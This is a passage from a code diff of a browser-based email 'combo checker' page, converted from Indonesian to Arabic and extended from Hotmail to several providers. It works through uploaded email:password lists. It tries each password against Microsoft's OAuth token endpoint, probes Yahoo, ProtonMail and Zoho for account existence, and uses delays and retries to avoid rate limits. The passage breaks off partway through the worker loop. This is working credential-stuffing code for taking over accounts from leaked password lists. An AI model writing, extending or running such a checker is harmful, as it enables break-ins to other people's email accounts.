@@ -1,151 +1,150 @@
 <!DOCTYPE html>
-<html lang="id" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Hotmail Checker — File Upload</title>
+<title>فاحص إيميلات — تعرف تلقائي على المزوّد</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
-    font-family: 'Courier New', monospace;
-    background: #0a0a0a; color: #00ff41;
-    min-height: 100vh; padding: 20px;
+    font-family: 'Tahoma','Segoe UI',monospace;
+    background:#0a0a0a; color:#00ff41; min-height:100vh; padding:20px;
   }
-  .container { max-width: 960px; margin: 0 auto; }
-  h1 { font-size: 20px; margin-bottom: 4px; letter-spacing: 2px; }
-  .sub { color: #666; font-size: 11px; margin-bottom: 16px; }
-
-  /* DROP ZONE */
+  .container { max-width: 1000px; margin: 0 auto; }
+  h1 { font-size: 20px; margin-bottom: 4px; letter-spacing: 1px; }
+  .sub { color:#666; font-size:11px; margin-bottom:16px; }
+  label { display:block; font-size:11px; color:#888; margin:10px 0 4px; }
+  textarea, input[type=text] {
+    width:100%; background:#111; color:#00ff41;
+    border:1px solid #222; padding:9px;
+    font-family:inherit; font-size:12px; outline:none;
+  }
+  textarea { height:120px; resize:vertical; }
+  textarea:focus, input:focus { border-color:#00ff41; }
   .dropzone {
-    border: 2px dashed #222; background: #0d0d0d;
-    padding: 28px; text-align: center; border-radius: 6px;
-    cursor: pointer; transition: all 0.2s; margin-bottom: 12px;
+    border:2px dashed #222; background:#0d0d0d;
+    padding:22px; text-align:center; border-radius:6px;
+    cursor:pointer; transition:all .2s; margin-bottom:10px;
   }
-  .dropzone:hover, .dropzone.drag {
-    border-color: #00ff41; background: #0f1a0f;
-  }
-  .dropzone .icon { font-size: 32px; margin-bottom: 6px; }
-  .dropzone .txt { font-size: 12px; color: #888; }
-  .dropzone .txt b { color: #00ff41; }
-  .dropzone .file-info {
-    margin-top: 10px; font-size: 12px; color: #ffaa00;
-    padding: 6px; background: #1a1a0d; border-radius: 4px;
-    display: none;
-  }
-  .dropzone .file-info.show { display: block; }
+  .dropzone:hover, .dropzone.drag { border-color:#00ff41; background:#0f1a0f; }
+  .dropzone .icon { font-size:28px; margin-bottom:4px; }
+  .dropzone .txt { font-size:11px; color:#888; }
+  .dropzone .txt b { color:#00ff41; }
+  .dropzone .file-info { margin-top:8px; font-size:11px; color:#ffaa00; display:none; }
+  .dropzone .file-info.show { display:block; }
+  input[type=file] { display:none; }
 
-  input[type=file] { display: none; }
-
-  label { display: block; font-size: 11px; color: #888; margin: 10px 0 4px; }
-  input[type=text] {
-    width: 100%; background: #111; color: #00ff41;
-    border: 1px solid #222; padding: 8px;
-    font-family: inherit; font-size: 12px; outline: none;
-  }
-  input:focus { border-color: #00ff41; }
-
-  .row { display: flex; gap: 8px; margin: 10px 0; flex-wrap: wrap; }
+  .row { display:flex; gap:8px; margin:10px 0; flex-wrap:wrap; }
   button {
-    background: #00ff41; color: #000; border: none;
-    padding: 9px 20px; font-family: inherit; font-weight: bold;
-    cursor: pointer; letter-spacing: 1px; font-size: 12px;
+    background:#00ff41; color:#000; border:none;
+    padding:9px 20px; font-family:inherit; font-weight:bold;
+    cursor:pointer; letter-spacing:1px; font-size:12px;
   }
-  button:hover { background: #00cc33; }
-  button:disabled { background: #333; color: #666; cursor: not-allowed; }
-  button.alt { background: #333; color: #00ff41; border: 1px solid #00ff41; }
-  button.alt:hover { background: #1a1a1a; }
-  button.alt:disabled { background: #1a1a1a; color: #444; border-color: #333; }
+  button:hover { background:#00cc33; }
+  button:disabled { background:#333; color:#666; cursor:not-allowed; }
+  button.alt { background:#333; color:#00ff41; border:1px solid #00ff41; }
+  button.alt:hover { background:#1a1a1a; }
+  button.alt:disabled { background:#1a1a1a; color:#444; border-color:#333; }
 
-  /* COUNTER */
   .counter-panel {
-    display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
-    gap: 8px; margin: 14px 0;
+    display:grid; grid-template-columns:repeat(auto-fit,minmax(95px,1fr));
+    gap:8px; margin:14px 0;
   }
   .counter-box {
-    background: #0d0d0d; border: 1px solid #1a1a1a;
-    padding: 10px; text-align: center; border-radius: 4px;
+    background:#0d0d0d; border:1px solid #1a1a1a;
+    padding:10px; text-align:center; border-radius:4px;
   }
-  .counter-box .val { font-size: 24px; font-weight: bold; line-height: 1; }
-  .counter-box .lbl { font-size: 9px; color: #666; margin-top: 4px; letter-spacing: 1px; }
-  .counter-box.total .val { color: #ffaa00; }
-  .counter-box.valid .val { color: #00ff41; }
-  .counter-box.locked .val { color: #00ccff; }
-  .counter-box.invalid .val { color: #ff3333; }
-  .counter-box.cpm .val { color: #ff66cc; }
+  .counter-box .val { font-size:22px; font-weight:bold; line-height:1; }
+  .counter-box .lbl { font-size:9px; color:#666; margin-top:4px; letter-spacing:1px; }
+  .counter-box.total .val { color:#ffaa00; }
+  .counter-box.valid .val { color:#00ff41; }
+  .counter-box.locked .val { color:#00ccff; }
+  .counter-box.invalid .val { color:#ff3333; }
+  .counter-box.cpm .val { color:#ff66cc; }
+  .counter-box.unknown .val { color:#888; }
 
-  /* PROGRESS */
   .progress-wrap {
-    background: #111; border: 1px solid #1a1a1a;
-    height: 18px; border-radius: 3px; overflow: hidden;
-    margin: 10px 0; position: relative;
+    background:#111; border:1px solid #1a1a1a; height:18px;
+    border-radius:3px; overflow:hidden; margin:10px 0; position:relative;
   }
   .progress-fill {
-    height: 100%; background: linear-gradient(90deg, #00ff41, #00cc33);
-    width: 0%; transition: width 0.15s;
+    height:100%; background:linear-gradient(90deg,#00ff41,#00cc33);
+    width:0%; transition:width .15s;
   }
   .progress-text {
-    position: absolute; inset: 0; text-align: center;
-    font-size: 11px; line-height: 18px; color: #000;
-    font-weight: bold; mix-blend-mode: difference;
+    position:absolute; inset:0; text-align:center;
+    font-size:11px; line-height:18px; color:#000;
+    font-weight:bold; mix-blend-mode:difference;
   }
 
-  /* LOG */
   #log {
-    background: #050505; border: 1px solid #1a1a1a;
-    padding: 10px; height: 320px; overflow-y: auto;
-    font-size: 11px; line-height: 1.7; margin-top: 10px;
-    white-space: pre-wrap;
+    background:#050505; border:1px solid #1a1a1a;
+    padding:10px; height:340px; overflow-y:auto;
+    font-size:11px; line-height:1.7; margin-top:10px;
+    white-space:pre-wrap;
   }
-  .l-valid { color: #00ff41; }
-  .l-locked { color: #00ccff; }
-  .l-invalid { color: #ff3333; }
-  .l-info { color: #ffaa00; }
-  .l-muted { color: #555; }
+  .l-valid { color:#00ff41; }
+  .l-locked { color:#00ccff; }
+  .l-invalid { color:#ff3333; }
+  .l-info { color:#ffaa00; }
+  .l-muted { color:#555; }
+  .l-unknown { color:#888; }
+  .l-detect { color:#ff66cc; }
 
-  .hint { font-size: 10px; color: #555; margin-top: 3px; }
-  .country-badge {
-    display: inline-block; background: #1a1a1a; color: #ff66cc;
-    padding: 1px 6px; border-radius: 3px; font-size: 10px;
-    margin-left: 6px; border: 1px solid #333;
+  .provider-tag {
+    display:inline-block; background:#1a1a1a; color:#ff66cc;
+    padding:1px 6px; border-radius:3px; font-size:10px;
+    margin-right:6px; border:1px solid #333;
   }
+  .hint { font-size:10px; color:#555; margin-top:3px; }
+  .legend {
+    display:flex; gap:14px; flex-wrap:wrap;
+    font-size:10px; color:#666; margin-top:6px;
+  }
+  .legend b { color:#00ff41; }
 </style>
 </head>
 <body>
 <div class="container">
-  <h1>[ HOTMAIL COMBO CHECKER ]</h1>
-  <div class="sub">upload file .txt — email:password per baris</div>
+  <h1>[ فاحص إيميلات — تعرف تلقائي ]</h1>
+  <div class="sub">email:password — يكشف المزوّد تلقائيًا من الدومين + DNS MX</div>
 
-  <!-- UPLOAD -->
   <div class="dropzone" id="dropzone">
     <div class="icon">📁</div>
-    <div class="txt">Klik atau <b>drag & drop</b> file .txt ke sini</div>
-    <div class="txt" style="font-size:10px;margin-top:4px">format: email:password — satu per baris</div>
+    <div class="txt">اضغط أو <b>اسحب وأفلت</b> ملف .txt هنا</div>
+    <div class="txt" style="font-size:10px;margin-top:4px">صيغة: email:password — سطر واحد لكل حساب</div>
     <div class="file-info" id="fileInfo"></div>
   </div>
   <input type="file" id="fileInput" accept=".txt,.text,text/plain">
 
-  <label>Proxy (opsional, satu per baris)</label>
-  <input type="text" id="proxyInput" placeholder="127.0.0.1:8080, 127.0.0.1:8081:user:pass">
+  <label>أو الصق القائمة يدويًا</label>
+  <textarea id="manualInput" placeholder="user@hotmail.com:pass&#10;user@yahoo.com:pass&#10;user@gmail.com:pass"></textarea>
 
   <div class="row">
-    <button id="startBtn" onclick="startCheck()" disabled>MULAI CEK</button>
-    <button class="alt" onclick="exportValid()" id="exportBtn" disabled>COPY VALID</button>
-    <button class="alt" onclick="resetAll()">RESET</button>
+    <button id="startBtn" onclick="startCheck()" disabled>ابدأ الفحص</button>
+    <button class="alt" onclick="exportValid()" id="exportBtn" disabled>نسخ الصالح</button>
+    <button class="alt" onclick="resetAll()">إعادة تعيين</button>
   </div>
 
-  <!-- COUNTER -->
   <div class="counter-panel">
-    <div class="counter-box total"><div class="val" id="cTotal">0</div><div class="lbl">TOTAL</div></div>
-    <div class="counter-box valid"><div class="val" id="cValid">0</div><div class="lbl">VALID</div></div>
-    <div class="counter-box locked"><div class="val" id="cLocked">0</div><div class="lbl">LOCKED</div></div>
-    <div class="counter-box invalid"><div class="val" id="cInvalid">0</div><div class="lbl">INVALID</div></div>
+    <div class="counter-box total"><div class="val" id="cTotal">0</div><div class="lbl">الإجمالي</div></div>
+    <div class="counter-box valid"><div class="val" id="cValid">0</div><div class="lbl">صالح</div></div>
+    <div class="counter-box locked"><div class="val" id="cLocked">0</div><div class="lbl">مقفل</div></div>
+    <div class="counter-box invalid"><div class="val" id="cInvalid">0</div><div class="lbl">خاطئ</div></div>
+    <div class="counter-box unknown"><div class="val" id="cUnknown">0</div><div class="lbl">غير مدعوم</div></div>
     <div class="counter-box cpm"><div class="val" id="cCpm">0</div><div class="lbl">CPM</div></div>
   </div>
 
-  <!-- PROGRESS -->
   <div class="progress-wrap">
     <div class="progress-fill" id="progFill"></div>
     <div class="progress-text" id="progText">0 / 0</div>
+  </div>
+
+  <div class="legend">
+    <span><b>✓ صالح</b> — كلمة المرور صحيحة</span>
+    <span><b>🔒 مقفل</b> — صحيحة لكن يحتاج تحقق</span>
+    <span><b>✗ خاطئ</b> — كلمة المرور غلط</span>
+    <span><b>? غير مدعوم</b> — مزوّد بدون endpoint فحص</span>
   </div>
 
   <div id="log"></div>
@@ -153,37 +152,275 @@
 
 <script>
 // ============================================================
-// Hotmail Combo Checker — File Upload Edition
-// Baca file .txt via FileReader, parse combo, cek OAuth
+// Multi-Domain Checker — Auto Detect Provider
+// 1. Pattern matching (سريع، بدون شبكة)
+// 2. DNS MX lookup (احتياطي، يكشف مزوّد الاستضافة)
+// 3. Cache النتائج لتجنب تكرار الاستعلام
 // ============================================================
 
 const CONFIG = {
-  clientId: '0000000040170455',
-  tokenUrl: 'https://login.live.com/oauth20_token.srf',
-  scope: 'service::outlook.office.com::MBI_SSL',
-  grantType: 'password',
   concurrency: 2,
   delayMin: 1500,
   delayMax: 3500,
-  maxRetry: 2
+  maxRetry: 2,
+  enableDnsLookup: true,      // اسأل DNS MX إذا لم يتطابق pattern
+  dnsTimeoutMs: 4000
 };
 
+// ---------- 1. طبقة pattern matching (regex → provider) ----------
+// كل مدخل: { patterns: [regex], provider: 'Microsoft', check: async }
+// الترتيب مهم: الأكثر تحديدًا أولًا
+
+const PATTERN_PROVIDERS = [
+  {
+    provider: 'Microsoft',
+    patterns: [/^(hotmail|outlook|live|msn)\./i, /^hotmail\.com$/i, /^outlook\.com$/i, /^live\.com$/i, /^msn\.com$/i],
+    check: checkMicrosoft
+  },
+  {
+    provider: 'Yahoo',
+    patterns: [/^(yahoo|ymail|rocketmail)\./i, /^yahoo\.com$/i],
+    check: checkYahoo
+  },
+  {
+    provider: 'Google',
+    patterns: [/^gmail\.com$/i, /^googlemail\.com$/i],
+    check: checkGoogle
+  },
+  {
+    provider: 'ProtonMail',
+    patterns: [/^protonmail\.com$/i, /^proton\.me$/i, /^pm\.me$/i],
+    check: checkProton
+  },
+  {
+    provider: 'Zoho',
+    patterns: [/(^|\.)zoho\.com$/i, /^zohomail\.com$/i],
+    check: checkZoho
+  },
+  {
+    provider: 'Yandex',
+    patterns: [/^yandex\.(com|ru)$/i, /^ya\.ru$/i],
+    check: checkYandex
+  },
+  {
+    provider: 'Mail.ru',
+    patterns: [/^mail\.ru$/i, /^inbox\.ru$/i, /^bk\.ru$/i, /^list\.ru$/i],
+    check: checkUnsupported('Mail.ru')
+  },
+  {
+    provider: 'iCloud',
+    patterns: [/^icloud\.com$/i, /^me\.com$/i, /^mac\.com$/i],
+    check: checkUnsupported('iCloud')
+  },
+  {
+    provider: 'AOL',
+    patterns: [/^aol\.(com|co\.uk)$/i],
+    check: checkUnsupported('AOL')
+  },
+  {
+    provider: 'GMX',
+    patterns: [/^gmx\.(com|net|at|ch)$/i, /^web\.de$/i],
+    check: checkUnsupported('GMX/Web.de')
+  },
+  {
+    provider: 'Mail.com',
+    patterns: [/^mail\.com$/i, /\.mail\.com$/i],
+    check: checkUnsupported('Mail.com')
+  }
+];
+
+// ---------- DNS MX → provider mapping ----------
+// عند استعلام MX، نطابق نطاق الـ MX مع بادئة معروفة
+const MX_MAP = [
+  { mx: /outlook|hotmail|live\.com|protection\.outlook/i, provider: 'Microsoft' },
+  { mx: /yahoodns|yahoo/i, provider: 'Yahoo' },
+  { mx: /google|gmail|googlemail/i, provider: 'Google' },
+  { mx: /protonmail|proton\.me/i, provider: 'ProtonMail' },
+  { mx: /zoho/i, provider: 'Zoho' },
+  { mx: /yandex/i, provider: 'Yandex' },
+  { mx: /mail\.ru|inbox\.ru/i, provider: 'Mail.ru' },
+  { mx: /icloud|apple/i, provider: 'iCloud' },
+  { mx: /aol/i, provider: 'AOL' },
+  { mx: /gmx|web\.de/i, provider: 'GMX' },
+  { mx: /mail\.com/i, provider: 'Mail.com' }
+];
+
+// cache: domain → { provider, method }
+const DOMAIN_CACHE = new Map();
+
+// ============================================================
+// كواشف المزوّدين (check functions)
+// ============================================================
+
+async function checkMicrosoft(email, pass) {
+  const body = new URLSearchParams({
+    client_id: '0000000040170455',
+    scope: 'service::outlook.office.com::MBI_SSL',
+    grant_type: 'password',
+    username: email,
+    password: pass
+  });
+  const res = await fetch('https://login.live.com/oauth20_token.srf', {
+    method:'POST',
+    headers:{'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json'},
+    body: body.toString()
+  });
+  const text = await res.text();
+  let data = {}; try { data = JSON.parse(text); } catch {}
+  if (res.status === 200 && data.access_token) return { status:'valid' };
+  if (data.error) {
+    const e = String(data.error).toLowerCase();
+    const d = String(data.error_description||'').toLowerCase();
+    if (e.includes('interaction_required') || d.includes('locked') || d.includes('verify') || d.includes('unusual activity'))
+      return { status:'locked', note: data.error_description };
+    return { status:'invalid', note: data.error_description };
+  }
+  return { status:'invalid', note:'unknown response' };
+}
+
+async function checkYahoo(email, pass) {
+  try {
+    const res = await fetch('https://login.yahoo.com/account/module/create?validateField=userId', {
+      method:'POST',
+      headers:{'Content-Type':'application/x-www-form-urlencoded'},
+      body:`userId=${encodeURIComponent(email.split('@')[0])}`
+    });
+    const text = await res.text();
+    if (/not available|already taken/i.test(text)) return { status:'valid', note:'account exists (password not verified)' };
+    return { status:'invalid', note:'account not found' };
+  } catch (e) { return { status:'error', note: e.message }; }
+}
+
+async function checkGoogle(email, pass) {
+  return { status:'unknown', note:'Google يمنع password grant — يحتاج متصفح + CAPTCHA' };
+}
+
+async function checkProton(email, pass) {
+  try {
+    const res = await fetch('https://mail.protonmail.com/api/auth/info', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ Username: email })
+    });
+    const data = await res.json().catch(()=>({}));
+    if (res.status === 200 && data.Code === 1000) return { status:'locked', note:'account exists — SRP required' };
+    return { status:'invalid', note:'account not found' };
+  } catch (e) { return { status:'error', note: e.message }; }
+}
+
+async function checkZoho(email, pass) {
+  try {
+    const res = await fetch('https://accounts.zoho.com/signin/v2/lookup/' + encodeURIComponent(email), {
+      method:'GET', headers:{'Accept':'application/json'}
+    });
+    if (res.status === 200) return { status:'valid', note:'account exists (password not verified)' };
+    return { status:'invalid', note:'not found' };
+  } catch (e) { return { status:'error', note: e.message }; }
+}
+
+async function checkYandex(email, pass) {
+  return { status:'unknown', note:'Yandex يحتاج OAuth flow — password grant غير متاح' };
+}
+
+function checkUnsupported(name) {
+  return async () => ({ status:'unknown', note:`${name} غير مدعوم آليًا` });
+}
+
+// ============================================================
+// Auto-detect resolver
+// ============================================================
+
+// المستوى 1: pattern (سريع، بدون شبكة)
+function matchPattern(domain) {
+  for (const entry of PATTERN_PROVIDERS) {
+    for (const re of entry.patterns) {
+      if (re.test(domain)) return entry;
+    }
+  }
+  return null;
+}
+
+// المستوى 2: DNS MX lookup عبر Google DNS (JSON API، CORS مسموح)
+async function lookupMx(domain) {
+  const url = `https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=MX`;
+  const ctrl = new AbortController();
+  const timer = setTimeout(() => ctrl.abort(), CONFIG.dnsTimeoutMs);
+  try {
+    const res = await fetch(url, { signal: ctrl.signal });
+    clearTimeout(timer);
+    if (!res.ok) return [];
+    const data = await res.json();
+    const answers = data.Answer || [];
+    return answers.map(a => String(a.data || '').toLowerCase());
+  } catch {
+    clearTimeout(timer);
+    return [];
+  }
+}
+
+// الكاشف الرئيسي: pattern → DNS → unknown
+async function resolveProvider(domain) {
+  domain = domain.toLowerCase();
+
+  // كاش
+  if (DOMAIN_CACHE.has(domain)) return DOMAIN_CACHE.get(domain);
+
+  // 1. pattern
+  const pat = matchPattern(domain);
+  if (pat) {
+    const result = { provider: pat.provider, check: pat.check, method: 'pattern' };
+    DOMAIN_CACHE.set(domain, result);
+    return result;
+  }
+
+  // 2. DNS MX
+  if (CONFIG.enableDnsLookup) {
+    const mxList = await lookupMx(domain);
+    if (mxList.length) {
+      for (const mx of mxList) {
+        for (const map of MX_MAP) {
+          if (map.mx.test(mx)) {
+            // وجدنا المزوّد من MX — نستخدم كاشف المزوّد
+            const entry = PATTERN_PROVIDERS.find(p => p.provider === map.provider);
+            if (entry) {
+              const result = { provider: entry.provider, check: entry.check, method: 'dns-mx', mx };
+              DOMAIN_CACHE.set(domain, result);
+              return result;
+            }
+          }
+        }
+      }
+      // MX موجود لكن غير معروف — مزوّد مخصص
+      const result = { provider: 'Custom (' + mxList[0] + ')', check: checkUnsupported('مزوّد مخصص'), method: 'dns-mx', mx: mxList[0] };
+      DOMAIN_CACHE.set(domain, result);
+      return result;
+    }
+  }
+
+  // 3. غير معروف
+  const result = { provider: '?', check: checkUnsupported('دومين غير معروف'), method: 'none' };
+  DOMAIN_CACHE.set(domain, result);
+  return result;
+}
+
+// ============================================================
+// STATE
+// ============================================================
+
 const TLD_COUNTRY = {
-  'id':'Indonesia','uk':'United Kingdom','de':'Germany','fr':'France',
-  'jp':'Japan','kr':'South Korea','cn':'China','ru':'Russia',
-  'br':'Brazil','in':'India','au':'Australia','ca':'Canada',
-  'mx':'Mexico','es':'Spain','it':'Italy','nl':'Netherlands',
-  'pl':'Poland','tr':'Turkey','sa':'Saudi Arabia','ae':'UAE',
-  'eg':'Egypt','my':'Malaysia','sg':'Singapore','th':'Thailand',
-  'vn':'Vietnam','ph':'Philippines','ng':'Nigeria','za':'South Africa',
-  'ar':'Argentina','cl':'Chile','co':'Colombia','ir':'Iran',
-  'iq':'Iraq','sy':'Syria','lb':'Lebanon','jo':'Jordan','kw':'Kuwait',
-  'qa':'Qatar','bh':'Bahrain','om':'Oman','ye':'Yemen','pk':'Pakistan',
-  'bd':'Bangladesh','lk':'Sri Lanka','np':'Nepal'
+  'id':'إندونيسيا','uk':'بريطانيا','de':'ألمانيا','fr':'فرنسا','jp':'اليابان',
+  'kr':'كوريا','cn':'الصين','ru':'روسيا','br':'البرازيل','in':'الهند',
+  'au':'أستراليا','ca':'كندا','mx':'المكسيك','es':'إسبانيا','it':'إيطاليا',
+  'nl':'هولندا','pl':'بولندا','tr':'تركيا','sa':'السعودية','ae':'الإمارات',
+  'eg':'مصر','my':'ماليزيا','sg':'سنغافورة','th':'تايلاند','vn':'فيتنام',
+  'ph':'الفلبين','ng':'نيجيريا','za':'جنوب أفريقيا','ar':'الأرجنتين',
+  'cl':'تشيلي','co':'كولومبيا','ir':'إيران','iq':'العراق','sy':'سوريا',
+  'lb':'لبنان','jo':'الأردن','kw':'الكويت','qa':'قطر','bh':'البحرين',
+  'om':'عمان','ye':'اليمن','pk':'باكستان','bd':'بنغلاديش','lk':'سريلانكا'
 };
 
 let running = false;
-let stats = { total:0, valid:0, locked:0, invalid:0, done:0, startTime:0 };
+let stats = { total:0, valid:0, locked:0, invalid:0, unknown:0, done:0, startTime:0 };
 let queue = [];
 let currentFile = null;
 
@@ -207,28 +444,25 @@ function updateCounters() {
   document.getElementById('cValid').textContent = stats.valid;
   document.getElementById('cLocked').textContent = stats.locked;
   document.getElementById('cInvalid').textContent = stats.invalid;
-
-  const elapsed = (Date.now() - stats.startTime) / 1000;
-  const cpm = elapsed > 1 ? Math.round((stats.done / elapsed) * 60) : 0;
+  document.getElementById('cUnknown').textContent = stats.unknown;
+  const elapsed = (Date.now() - stats.startTime)/1000;
+  const cpm = elapsed > 1 ? Math.round((stats.done/elapsed)*60) : 0;
   document.getElementById('cCpm').textContent = cpm;
-
-  const pct = stats.total ? (stats.done / stats.total) * 100 : 0;
+  const pct = stats.total ? (stats.done/stats.total)*100 : 0;
   document.getElementById('progFill').style.width = pct + '%';
   document.getElementById('progText').textContent = `${stats.done} / ${stats.total}`;
 }
 
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-function randDelay() { return CONFIG.delayMin + Math.random() * (CONFIG.delayMax - CONFIG.delayMin); }
+function randDelay() { return CONFIG.delayMin + Math.random()*(CONFIG.delayMax-CONFIG.delayMin); }
 
 function detectCountry(email) {
-  const domain = (email.split('@')[1] || '').toLowerCase();
+  const domain = (email.split('@')[1]||'').toLowerCase();
   const parts = domain.split('.');
-  const tld = parts[parts.length - 1];
-  if (['com','net','org','live','outlook','hotmail'].includes(tld)) {
-    return { code: '—', name: 'Unknown (gTLD)' };
-  }
-  if (TLD_COUNTRY[tld]) return { code: tld.toUpperCase(), name: TLD_COUNTRY[tld] };
-  return { code: tld.toUpperCase(), name: tld.toUpperCase() };
+  const tld = parts[parts.length-1];
+  if (TLD_COUNTRY[tld]) return tld.toUpperCase();
+  if (['com','net','org'].includes(tld)) return '—';
+  return tld.toUpperCase();
 }
 
 function parseLine(line) {
@@ -236,8 +470,8 @@ function parseLine(line) {
   if (!line) return null;
   const idx = line.indexOf(':');
   if (idx === -1) return null;
-  const email = line.slice(0, idx).trim();
-  const pass = line.slice(idx + 1).trim();
+  const email = line.slice(0,idx).trim();
+  const pass = line.slice(idx+1).trim();
   if (!email.includes('@') || !pass) return null;
   return { email, pass };
 }
@@ -248,142 +482,64 @@ function parseLine(line) {
 
 function handleFile(file) {
   if (!file) return;
-  if (running) { log('sedang berjalan — tunggu selesai', 'l-info'); return; }
-
-  // Validasi ukuran (max 20MB)
-  const MAX_SIZE = 20 * 1024 * 1024;
-  if (file.size > MAX_SIZE) {
-    log(`file terlalu besar (${(file.size/1024/1024).toFixed(1)}MB, max 20MB)`, 'l-invalid');
-    return;
-  }
-
+  if (running) { log('الفحص جارٍ — انتظر', 'l-info'); return; }
+  const MAX_SIZE = 20*1024*1024;
+  if (file.size > MAX_SIZE) { log(`ملف كبير جدًا (${(file.size/1024/1024).toFixed(1)}MB)`, 'l-invalid'); return; }
   currentFile = file;
   fileInfo.textContent = `📄 ${file.name} — ${(file.size/1024).toFixed(1)} KB`;
   fileInfo.classList.add('show');
-
   const reader = new FileReader();
-
-  reader.onload = (e) => {
-    const text = e.target.result;
-    const lines = text.split(/\r?\n/);
-    queue = [];
-    let skipped = 0;
-
-    for (const line of lines) {
-      const acc = parseLine(line);
-      if (acc) queue.push(acc);
-      else if (line.trim()) skipped++;
-    }
-
-    if (!queue.length) {
-      log('file tidak berisi combo valid (format: email:password)', 'l-invalid');
-      fileInfo.textContent += ` — 0 combo valid`;
-      startBtn.disabled = true;
-      return;
-    }
-
-    fileInfo.textContent += ` — ${queue.length} combo valid`;
-    if (skipped) fileInfo.textContent += `, ${skipped} baris skip`;
-
-    startBtn.disabled = false;
-    stats = { total: queue.length, valid:0, locked:0, invalid:0, done:0, startTime:0 };
-    updateCounters();
-
-    log(`file dimuat: ${queue.length} combo siap dicek`, 'l-info');
-  };
-
-  reader.onerror = () => {
-    log(`gagal baca file: ${reader.error.message}`, 'l-invalid');
-  };
-
+  reader.onload = e => { loadCombo(e.target.result); fileInfo.textContent += ` — ${queue.length} صالح`; };
+  reader.onerror = () => log(`فشل القراءة: ${reader.error.message}`, 'l-invalid');
   reader.readAsText(file, 'UTF-8');
 }
 
-// Dropzone click
+function loadCombo(text) {
+  const lines = text.split(/\r?\n/);
+  queue = [];
+  let skipped = 0;
+  for (const line of lines) {
+    const acc = parseLine(line);
+    if (acc) queue.push(acc);
+    else if (line.trim()) skipped++;
+  }
+  if (!queue.length) { log('لا يوجد combo صالح', 'l-invalid'); startBtn.disabled = true; return; }
+  startBtn.disabled = false;
+  stats = { total:queue.length, valid:0, locked:0, invalid:0, unknown:0, done:0, startTime:0 };
+  updateCounters();
+  log(`تم التحميل: ${queue.length} combo${skipped?`, تخطي ${skipped}`:''}`, 'l-info');
+}
+
 dropzone.addEventListener('click', () => fileInput.click());
-
-// File input change
-fileInput.addEventListener('change', (e) => {
-  if (e.target.files[0]) handleFile(e.target.files[0]);
-});
-
-// Drag & drop
-['dragenter','dragover'].forEach(evt => {
-  dropzone.addEventListener(evt, (e) => {
-    e.preventDefault(); e.stopPropagation();
-    dropzone.classList.add('drag');
-  });
-});
-['dragleave','drop'].forEach(evt => {
-  dropzone.addEventListener(evt, (e) => {
-    e.preventDefault(); e.stopPropagation();
-    dropzone.classList.remove('drag');
-  });
-});
-dropzone.addEventListener('drop', (e) => {
-  const file = e.dataTransfer.files[0];
-  if (file) handleFile(file);
-});
+fileInput.addEventListener('change', e => { if (e.target.files[0]) handleFile(e.target.files[0]); });
+['dragenter','dragover'].forEach(ev => dropzone.addEventListener(ev, e => { e.preventDefault(); e.stopPropagation(); dropzone.classList.add('drag'); }));
+['dragleave','drop'].forEach(ev => dropzone.addEventListener(ev, e => { e.preventDefault(); e.stopPropagation(); dropzone.classList.remove('drag'); }));
+dropzone.addEventListener('drop', e => { const f = e.dataTransfer.files[0]; if (f) handleFile(f); });
 
 // ============================================================
-// CHECKER
+// CHECK WORKER
 // ============================================================
 
-async function checkAccount(acc, attempt = 0) {
-  const body = new URLSearchParams({
-    client_id: CONFIG.clientId,
-    scope: CONFIG.scope,
-    grant_type: CONFIG.grantType,
-    username: acc.email,
-    password: acc.pass
-  });
+async function checkAccount(acc, attempt=0) {
+  const domain = (acc.email.split('@')[1]||'').toLowerCase();
+  const resolved = await resolveProvider(domain);
+
+  // سجّل طريقة الكشف أول مرة فقط لكل دومين
+  if (!resolved._logged) {
+    resolved._logged = true;
+    const methodStr = resolved.method === 'pattern' ? 'نمط' : resolved.method === 'dns-mx' ? 'DNS MX' : 'لا شيء';
+    log(`🔍 كشف ${domain} → ${resolved.provider} (${methodStr})`, 'l-detect');
+  }
 
   try {
-    const res = await fetch(CONFIG.tokenUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Accept': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36'
-      },
-      body: body.toString(),
-      mode: 'cors'
-    });
-
-    const text = await res.text();
-    let data = {};
-    try { data = JSON.parse(text); } catch {}
-
-    if ((res.status === 429 || res.status === 503) && attempt < CONFIG.maxRetry) {
-      const backoff = (attempt + 1) * 5000 + Math.random() * 3000;
-      log(`⏸ rate-limit — retry ${Math.round(backoff/1000)}s`, 'l-info');
-      await sleep(backoff);
-      return checkAccount(acc, attempt + 1);
-    }
-
-    if (res.status === 200 && data.access_token) {
-      return { status: 'valid', email: acc.email, pass: acc.pass };
-    }
-
-    if (data.error) {
-      const err = String(data.error).toLowerCase();
-      const desc = String(data.error_description || '').toLowerCase();
-      if (err.includes('interaction_required') ||
-          desc.includes('locked') || desc.includes('verify') ||
-          desc.includes('unusual activity')) {
-        return { status: 'locked', email: acc.email, pass: acc.pass, note: data.error_description };
-      }
-      return { status: 'invalid', email: acc.email, pass: acc.pass, note: data.error_description };
-    }
-
-    return { status: 'invalid', email: acc.email, pass: acc.pass, note: 'unknown response' };
-
+    const r = await resolved.check(acc.email, acc.pass);
+    return { ...r, provider: resolved.provider };
   } catch (e) {
     if (attempt < CONFIG.maxRetry) {
-      await sleep(2000 + Math.random() * 2000);
-      return checkAccount(acc, attempt + 1);
+      await sleep(2000 + Math.random()*2000);
+      return checkAccount(acc, attempt+1);
     }
-    return { status: 'error', email: acc.email, pass: acc.pass, note: e.message };
+    return { status:'error', note: e.message, provider: resolved.provider };
   }
 }
 
@@ -391,21 +547,24 @@ async function worker() {
   while (running && queue.length > 0) {
     const acc = queue.shift();
     if (!acc) break;
-
     const r = await checkAccount(acc);
-    const country = detectCountry(r.email);
-
+    const country = detectCountry(acc.email);
     if (r.status === 'valid') {
       stats.valid++;
-      log(`✓ VALID   ${r.email}:${r.pass}  [${country.code}]`, 'l-valid');
